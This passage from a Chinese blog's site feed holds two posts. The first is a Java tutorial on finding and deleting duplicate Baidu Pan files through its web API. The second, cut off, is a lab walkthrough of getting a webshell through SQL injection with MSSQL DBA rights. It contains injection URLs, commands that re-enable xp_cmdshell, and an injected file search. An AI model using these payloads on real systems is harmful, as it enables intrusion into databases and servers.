+<p>当遇到文件时，会返回文件的MD5和大小以及路径。<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/文件内容.jpg" alt="文件内容"></p>
+<p><strong>返回JSON中的主要内容说明</strong><br>只列举需要的字段</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>含义</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>isdir</td>
+<td>是否为目录</td>
+<td>文件为0，目录为1</td>
+</tr>
+<tr>
+<td>size</td>
+<td>文件大小</td>
+<td>单位是字节</td>
+</tr>
+<tr>
+<td>md5</td>
+<td>文件的MD5值</td>
+<td>可以用来判断文件是否重复</td>
+</tr>
+<tr>
+<td>path</td>
+<td>文件的路径</td>
+<td>包含文件名</td>
+</tr>
+<tr>
+<td>server_filename</td>
+<td>文件名称</td>
+<td>文件的名称</td>
+</tr>
+</tbody>
+</table>
+<p>于是可以根据文件的MD5值来判断文件是否重复。<br>首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。<br>这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。<br>因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。<br>具体实现步骤如下：</p>
+<h4 id="1-获取bdstoken"><a href="#1-获取bdstoken" class="headerlink" title="1.获取bdstoken"></a>1.获取bdstoken</h4><p>访问<a href="https://pan.baidu.com/wap/home" target="_blank" rel="external">https://pan.baidu.com/wap/home</a> ，查看源代码搜索bdstoken即可看到。<br>代码的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 获取bdstoken</div><div class="line"> * <span class="doctag">@return</span> bdstoken</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getbdstoken</span><span class="params">()</span></span>&#123;</div><div class="line">	String bdstoken = <span class="keyword">null</span>;</div><div class="line">	Document doc = getDoc(Util.URL_HOME,getCookies());</div><div class="line">	String regex = <span class="string">"\"bdstoken\":\"(.*)\",\"quota"</span>;</div><div class="line">	Pattern pattern = Pattern.compile(regex);</div><div class="line">	Matcher matcher = pattern.matcher(doc.html());</div><div class="line">	<span class="keyword">if</span>(matcher.find())&#123;</div><div class="line">		bdstoken = matcher.group(<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> bdstoken;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String,String&gt; <span class="title">getCookies</span><span class="params">()</span></span>&#123;</div><div class="line">	Map&lt;String,String&gt; cookies = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</div><div class="line">	cookies.put(<span class="string">"BDUSS"</span>, <span class="string">"你的BDUSS"</span>);</div><div class="line">	cookies.put(<span class="string">"STOKEN"</span>, <span class="string">"你的STOKEN"</span>);</div><div class="line">	<span class="keyword">return</span> cookies;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="2-递归获取所有的文件，并将文件的相关内容保存到数据库中"><a href="#2-递归获取所有的文件，并将文件的相关内容保存到数据库中" class="headerlink" title="2.递归获取所有的文件，并将文件的相关内容保存到数据库中"></a>2.递归获取所有的文件，并将文件的相关内容保存到数据库中</h4><p>获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。<br>如下代码所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 列出当前页面文件</div><div class="line"> * <span class="doctag">@param</span> page 页面</div><div class="line"> * <span class="doctag">@param</span> num 显示数量</div><div class="line"> * <span class="doctag">@param</span> dir 路径</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;PanFile&gt; <span class="title">getFiles</span><span class="params">(<span class="keyword">int</span> page,<span class="keyword">int</span> num,String dir)</span></span>&#123;</div><div class="line">	String url = <span class="string">"https://pan.baidu.com/api/list?bdstoken="</span>+getbdstoken()+<span class="string">"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page="</span>+page+<span class="string">"&amp;num="</span>+num+<span class="string">"&amp;dir="</span>+dir;</div><div class="line">	String jsonStr = getbody(url, getCookies());</div><div class="line">	JSONObject jsonObj = JSONObject.parseObject(jsonStr);</div><div class="line">	JSONArray result = jsonObj.getJSONArray(<span class="string">"list"</span>);</div><div class="line">	List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile.class);  </div><div class="line">	<span class="keyword">return</span> files;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>递归遍历当前路径下所有文件代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 递归打印当前路径下所有文件，并入库</div><div class="line"> * <span class="doctag">@param</span> str 路径</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printFiles</span><span class="params">(String str)</span></span>&#123;</div><div class="line">	<span class="keyword">boolean</span> flag=<span class="keyword">false</span>;</div><div class="line">	String dency[] = &#123;<span class="string">"/C#资料/我的c#"</span>,<span class="string">"/12-19 Java Workplace"</span>,<span class="string">"/dumppp"</span>,<span class="string">"/myWEB"</span>&#125;;<span class="comment">//白名单，针对其中的目录不遍历</span></div><div class="line">	<span class="keyword">for</span> (String string : dency) &#123;</div><div class="line">		<span class="keyword">if</span>(str.trim().equals(string))&#123;</div><div class="line">			flag = <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(!flag)&#123;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		str = URLEncoder.encode(str, <span class="string">"utf-8"</span>);</div><div class="line">	&#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">		<span class="comment">// TODO Auto-generated catch block</span></div><div class="line">		e.printStackTrace();</div><div class="line">	&#125;</div><div class="line">	List&lt;PanFile&gt; files= UtilMethod.getFiles(<span class="number">1</span>,<span class="number">2000</span>,str);</div><div class="line">	<span class="keyword">for</span> (PanFile panFile : files) &#123;</div><div class="line">		<span class="keyword">if</span>(panFile.getIsdir()==<span class="number">1</span>)&#123;</div><div class="line">			printFiles(panFile.getPath());</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			String fileName = panFile.getPath();</div><div class="line">			System.out.println(fileName+<span class="string">"---size:"</span>+panFile.getSize()+<span class="string">"--md5:"</span>+panFile.getMd5());</div><div class="line">			insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(),</div><div class="line">					panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(),</div><div class="line">					panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename());</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>效果如图所示</p>
+<p><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/遍历文件.jpg" alt="遍历文件"><br>查看数据库中的文件信息<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/数据库中文件信息.png" alt="数据库中文件信息"></p>
+<blockquote>
+<p>由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。<br>由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。<br>为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。<br>插入数据库方法的代码比较简单，这里就省略了。</p>
+</blockquote>
+<h4 id="3-获取重复的大文件"><a href="#3-获取重复的大文件" class="headerlink" title="3.获取重复的大文件"></a>3.获取重复的大文件</h4><p>已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。</p>
+<h5 id="1-获取大于500M的重复文件的MD5"><a href="#1-获取大于500M的重复文件的MD5" class="headerlink" title="1.获取大于500M的重复文件的MD5"></a>1.获取大于500M的重复文件的MD5</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 获取大于500M的重复文件的MD5</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp1</span><span class="params">()</span></span>&#123;</div><div class="line">	List&lt;String&gt; ltMd5 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">	String sql = <span class="string">"select count(*),md5,server_filename from mmpan "</span></div><div class="line">			+ <span class="string">"where size &gt; 1024*1024*500 "</span></div><div class="line">			+ <span class="string">"group by md5  "</span></div><div class="line">			+ <span class="string">"HAVING COUNT(md5) &gt;1 "</span></div><div class="line">			+ <span class="string">"order by path"</span>;</div><div class="line">	Connection conn = DBFactory.getConnection();</div><div class="line">	PreparedStatement pst = <span class="keyword">null</span>;</div><div class="line">	ResultSet rst = <span class="keyword">null</span>;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		pst = conn.prepareStatement(sql);</div><div class="line">		rst = pst.executeQuery();</div><div class="line">		<span class="keyword">while</span>(rst.next())&#123;</div><div class="line">			ltMd5.add(rst.getString(<span class="string">"md5"</span>));</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</div><div class="line">		<span class="comment">// TODO Auto-generated catch block</span></div><div class="line">		e.printStackTrace();</div><div class="line">	&#125;<span class="keyword">finally</span> &#123;</div><div class="line">		DBFactory.close(rst, pst, conn);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ltMd5;</div><div class="line">	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="2-根据步骤1获取文件的MD5值，获取最小path的长度"><a href="#2-根据步骤1获取文件的MD5值，获取最小path的长度" class="headerlink" title="2.根据步骤1获取文件的MD5值，获取最小path的长度"></a>2.根据步骤1获取文件的MD5值，获取最小path的长度</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 根据文件的MD5值，获取最小path的长度</div><div class="line"> * <span class="doctag">@param</span> md5</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">setp2</span><span class="params">(String md5)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> length = -<span class="number">1</span>;</div><div class="line">	String sql = <span class="string">"select min(LENGTH(path)) from mmpan where md5=?"</span>;</div><div class="line">	Connection conn = DBFactory.getConnection();</div><div class="line">	PreparedStatement pst = <span class="keyword">null</span>;</div><div class="line">	ResultSet rst = <span class="keyword">null</span>;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		pst = conn.prepareStatement(sql);</div><div class="line">		pst.setString(<span class="number">1</span>, md5);</div><div class="line">		rst = pst.executeQuery();</div><div class="line">		<span class="keyword">if</span>(rst.next())&#123;</div><div class="line">			length = rst.getInt(<span class="number">1</span>);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</div><div class="line">		<span class="comment">// TODO Auto-generated catch block</span></div><div class="line">		e.printStackTrace();</div><div class="line">	&#125;<span class="keyword">finally</span> &#123;</div><div class="line">		DBFactory.close(rst, pst, conn);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> length;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="3-根据MD5和最短路径，列出大于最短路径的文件"><a href="#3-根据MD5和最短路径，列出大于最短路径的文件" class="headerlink" title="3.根据MD5和最短路径，列出大于最短路径的文件"></a>3.根据MD5和最短路径，列出大于最短路径的文件</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 根据MD5和最短路径，列出大于最短路径的文件</div><div class="line"> * <span class="doctag">@param</span> md5</div><div class="line"> * <span class="doctag">@param</span> length</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp3</span><span class="params">(String md5,<span class="keyword">int</span> length)</span></span>&#123;</div><div class="line">	List&lt;String&gt; ltPath = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">	String sql = <span class="string">"select path from mmpan where md5=? and LENGTH(path) &gt; ?"</span>;</div><div class="line">	Connection conn = DBFactory.getConnection();</div><div class="line">	PreparedStatement pst = <span class="keyword">null</span>;</div><div class="line">	ResultSet rst = <span class="keyword">null</span>;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		pst = conn.prepareStatement(sql);</div><div class="line">		pst.setString(<span class="number">1</span>, md5);</div><div class="line">		pst.setInt(<span class="number">2</span>, length);</div><div class="line">		rst = pst.executeQuery();</div><div class="line">		<span class="keyword">while</span>(rst.next())&#123;</div><div class="line">			ltPath.add(rst.getString(<span class="number">1</span>));</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</div><div class="line">		<span class="comment">// TODO Auto-generated catch block</span></div><div class="line">		e.printStackTrace();</div><div class="line">	&#125;<span class="keyword">finally</span> &#123;</div><div class="line">		DBFactory.close(rst, pst, conn);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ltPath;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>获取这个列表是为了将其删除</p>
+</blockquote>
+<p>将以上三步综合起来，如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 获取指定条件下文件路径</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">getPaths</span><span class="params">()</span></span>&#123;</div><div class="line">	List&lt;String&gt; ltPath = <span class="keyword">null</span>;</div><div class="line">	List&lt;String&gt; ltPaths = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">	List&lt;String&gt; lt = UtilMethod.setp1();</div><div class="line">	<span class="keyword">int</span> length = -<span class="number">1</span> ;</div><div class="line">	<span class="keyword">for</span> (String md5 : lt) &#123;</div><div class="line">		length = UtilMethod.setp2(md5);</div><div class="line">		ltPath = UtilMethod.setp3(md5, length);</div><div class="line">		<span class="keyword">for</span> (String path : ltPath) &#123;</div><div class="line">			ltPaths.add(path);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ltPaths;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>此时列表中的文件都是为了删除的文件的路径。</p>
+<h3 id="0x02-如何实现删除文件"><a href="#0x02-如何实现删除文件" class="headerlink" title="0x02 如何实现删除文件"></a>0x02 如何实现删除文件</h3><p>删除文件时抓包，发现如下请求<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1</div><div class="line">Host: pan.baidu.com</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Cookie: Cookie</div><div class="line">Connection: close</div><div class="line">Content-Length: 61</div><div class="line"></div><div class="line">filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D</div></pre></td></tr></table></figure></p>
+<p>所需参数有bdstoken和删除文件的列表</p>
+<p>我们首先将需要删除文件拼接起来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * 根据文件路径拼接filelist</div><div class="line"> * @<span class="built_in">return</span></div><div class="line"> */</div><div class="line">public static String <span class="function"><span class="title">getFileList</span></span>()&#123;</div><div class="line">	List&lt;String&gt; ltPath = UtilMethod.getPaths();</div><div class="line">	StringBuilder sb = new StringBuilder();</div><div class="line">	sb.append(<span class="string">"["</span>);</div><div class="line">	<span class="keyword">for</span> (int i = 0; i &lt; 3; i++) &#123;</div><div class="line">		//System.out.println(ltPath.get(i));</div><div class="line">		sb.append(<span class="string">"\""</span>);</div><div class="line">		sb.append(ltPath.get(i));</div><div class="line">		sb.append(<span class="string">"\""</span>);</div><div class="line">		sb.append(<span class="string">","</span>);</div><div class="line">		</div><div class="line">	&#125;</div><div class="line">	sb.append(<span class="string">"***]"</span>);</div><div class="line">	<span class="built_in">return</span> sb.toString().replace(<span class="string">",***"</span>, <span class="string">""</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。</p>
+</blockquote>
+<p>删除文件的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 根据文件列表删除文件</div><div class="line"> * <span class="doctag">@param</span> filelist</div><div class="line"> * <span class="doctag">@return</span></div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">delRequest</span><span class="params">(String filelist)</span></span>&#123;</div><div class="line">	String url = <span class="string">"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken="</span>+getbdstoken()+<span class="string">"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0"</span>;</div><div class="line">	String result = <span class="string">"删除失败,请重试"</span>;</div><div class="line">	String jsonStr = getbody(url, getCookies(),filelist);</div><div class="line">	JSONObject jsonObj = JSONObject.parseObject(jsonStr);</div><div class="line">	<span class="keyword">if</span>(jsonObj.get(<span class="string">"errno"</span>).toString().equals(<span class="string">"0"</span>))&#123;</div><div class="line">		result = <span class="string">"文件删除成功，删除成功的文件为"</span>+filelist;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>测试删除的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Test</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testdelFile</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">	String fileList = UtilMethod.getFileList();</div><div class="line">	System.out.println(UtilMethod.delRequest(fileList));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>附上效果图<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/Java代码删除文件.gif" alt="Java代码删除文件"></p>
+<p>大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。<br>代码仅供参考。代码地址：<a href="http://fuping.site/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/BaiDuPan.rar">代码</a><br>Python的实现脚本<a href="https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py" target="_blank" rel="external">https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py</a> 。<br>python代码删除文件效果图<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/python代码删除文件.gif" alt="python代码删除文件"></p>
+<p>还有一种最快的实现方法就是开个会员o(╯□╰)o。</p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：<br>1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。<br>2.JSON解析，使用了FastJSON来实现<br>3.递归遍历的实现</p>
+<p>Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 编程开发 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 百度网盘 </tag>
+            
+            <tag> 快速清除 </tag>
+            
+            <tag> Java代码 </tag>
+            
+            <tag> Python脚本 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[MSSQL DBA权限获取WEBSHELL的过程]]></title>
+      <url>/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。<br>我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。</p>
+<a id="more"></a>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先找到一个如下的注入点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">' and 1=user;--</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/注入点.png" alt="注入点"></p>
+<p>通过SQLMAP可以查看到是DBA权限</p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/DBA权限.png" alt="DBA权限"></p>
+<p>创建临时表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';CREATE TABLE tt_tmp (tmp1 varchar(8000));--</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/创建临时表.png" alt="创建临时表"></p>
+<p>在WINDOWS下查找文件用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> /r 目录名:\ %i <span class="keyword">in</span> (匹配模式) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</div></pre></td></tr></table></figure>
+<p>例如在C盘下搜索NewsList.aspx，可以使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>或者<code>for /r c:\ %i in (Newslist.aspx*) do @echo %i</code></p>
+<p>使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>的搜索结果<br><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/正确的搜索方式.png" alt="正确的搜索方式"></p>
+<p>一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。<br>使用<code>for /r c:\ %i in (Newslist.aspx) do @echo %i</code>的搜索结果</p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/错误的搜索结果.png" alt="错误的搜索结果"></p>
+<p>用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';insert into tt_tmp(tmp1) exec master..xp_cmdshell '</span><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i <span class="string">';--</span></div></pre></td></tr></table></figure>
+<p>如果无法执行xp_cmdshell，并提示如下错误<code>SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。</code></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/无法执行xp_cmdshell.png" alt="无法执行xp_cmdshell"></p>
+<p>可以使用如下命令来启用xp_cmdshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</div><div class="line">RECONFIGURE;</div><div class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</div><div class="line">RECONFIGURE;--</div></pre></td></tr></table></figure>
+<p>然后再次执行搜索命令。</p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/执行搜索并结果插入到临时表.png" alt="执行搜索并结果插入到临时表"></p>
+<blockquote>
